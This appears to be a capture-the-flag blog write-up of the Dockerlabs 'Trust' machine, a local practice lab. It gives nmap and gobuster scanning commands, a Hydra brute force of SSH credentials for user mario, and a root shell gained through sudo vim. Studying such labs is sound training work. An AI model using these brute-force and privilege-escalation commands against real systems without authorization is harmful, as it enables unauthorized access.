---
layout: single
title: Trust - Dockerlabs
excerpt: "This very easy machine required performing fuzzing to find hidden directories and obtain a user. Then, we used Hydra to brute force and get the SSH credentials. Finally, to escalate to root, we used the vim binary which had sudo permissions."
date: 2024-06-22
classes: wide
header:
  teaser: /assets/images/dockerlabs-trust/trust-logo.png
  teaser_home_page: true
  icon: /assets/images/dockerlabs.png
categories:
  - dockerlabs
  - infosec
tags:
  - very easy
  - linux
  - bruteforce
  - privileged vim
---
![](/assets/images/dockerlabs-trust/trust_logo.png)
First, we start by setting up the lab using the root account (It's important to ensure the file has execution permissions).

```
sudo ./auto_deploy.sh trust.tar 
```

![](/assets/images/dockerlabs-trust/trust-1.png)

Test connectivity.
```
ping -c 1 172.18.0.2
```

![](/assets/images/dockerlabs-trust/trust-2.png)
## Portscan
Perform an initial scan to see which ports are open
```
nmap -p- -sS --min-rate 5000 -vvv -Pn 172.18.0.2 
```

![](/assets/images/dockerlabs-trust/trust-3.png)

Conduct a more specific scan to detect the versions of the previously found open ports.
```
nmap -p22,80 -sCV 172.18.0.2
```

![](/assets/images/dockerlabs-trust/trust-4.png)

## Apache
We notice there is an active web service and start exploring it.

![](/assets/images/dockerlabs-trust/trust-5.png)

Since we don't get much information from there, we use gobuster to discover hidden directories, specifically looking for php and html files in this case.

```
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html
```

![](/assets/images/dockerlabs-trust/trust-6.png)

Gobuster reports a directory called secret.php, which we check and it reveals a potential user named mario.

![](/assets/images/dockerlabs-trust/trust-7.png)
## Bruteforce
Since port 22 is also open, we use Hydra to brute force the SSH login for the user mario.
```sh
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

The results show that mario's password is chocolate.

![](/assets/images/dockerlabs-trust/trust-8.png)

We attempt to connect via SSH, and it works successfully.

![](/assets/images/dockerlabs-trust/trust-9.png)
## Privesc

To escalate privileges, we run the following command to see if there are any binaries that can be executed with sudo permissions.

```
sudo -l
```

We observe that we can execute vim with sudo permissions.

![](/assets/images/dockerlabs-trust/trust-10.png)

We open vim with sudo and create a shell, which will be created as root.
```
sudo vim
:!/bin/bash
```

![](/assets/images/dockerlabs-trust/trust-11.png)

![](/assets/images/dockerlabs-trust/trust-12.png)

After executing this last command, we are automatically authenticated as root, which we can verify by running the `whoami` command.
```
whoami
```

![](/assets/images/dockerlabs-trust/trust-13.png)
## pwned!
